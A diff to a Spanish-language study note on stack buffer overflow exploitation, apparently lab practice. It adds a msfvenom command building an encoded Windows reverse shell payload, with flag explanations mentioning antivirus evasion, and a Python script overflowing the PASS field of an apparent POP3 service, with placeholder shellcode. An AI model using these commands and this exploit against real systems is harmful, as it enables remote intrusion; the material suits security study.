@@ -21,20 +21,68 @@ msfvenom -l encoders
 ```
 
 
-genericamente para generar un shellcode puede ser asi
+tenemos entoces los badchars que son
+`\x00\x0a\x0d`
+
+por lo queq con msfvenom creariamos el shellcode de la siguiente manera
 
 ```sh
-msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=puerto_atacante -f py
-```
--p: 
---platform
--a
--f
+msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
+``` 
 
-lo que pasa es que no especificamos los badchars y por ahi 
-[[msfvenom]] no pone ningun encoder por lo que a este comando le falta *encoder* y los *badchars*
+- -p especificamos el payload
+- --platform especificamos el SO
+- -a es para la arquitectura
+- LHOST es la ip a donde redirige la consola
+- LPORT es el puerto de la maquina atacante
+- -f es el tipo de salida en este caso para un script en python
+- -e es el encoder en este caso ocupa shikata ga nai como encoder para tema de evasion de antivirus y demas
+- -b son los badchars que debe excluir en el shellcod
 
-el completo seria:
-```sh
-msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=puerto_atacante -f py -e x86/shikata_ga_nai
+- EXITFUNC es para que el exploit dependa de un proceso hijo y no se rompa el servicio una vez terminado
+
+
+
+por lo que ese shellcode hay que  copiarlo al codigo
+
+```python
+import socket
+import sys
+IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
+PORT =  110               # < --  puerto del servicio
+offset = 2606
+before_eip = b"A" * 2606
+eip = b"B" * 4
+shellcode = (b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
+b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23") # <- ESP - stack pointer
+
+payload = before_eip + eip + shellcode
+
+def exploit():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
+    s.connect((IP_ADDRESS, PORT))
+    banner = s.recv(1024)
+    print(f"[+] Banner: {banner}")
+    s.send(b"USER test\r\n")
+    response = s.recv(1024)
+    print(f"[+] Response: {response}")
+    s.send(b"PASS " + payload + b"\r\n")
+    s.close()
+if __name__ == '__main__':
+    if len(sys.argv) == 3:
+        IP_ADDRESS = sys.argv[1]
+        PORT = int(sys.argv[2])
+        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
+        exit(1)
+        
 ```
+
+
+ahora el tema de buscar el OpCode para saltar al ESP
+
+en [[mona (python)]] 
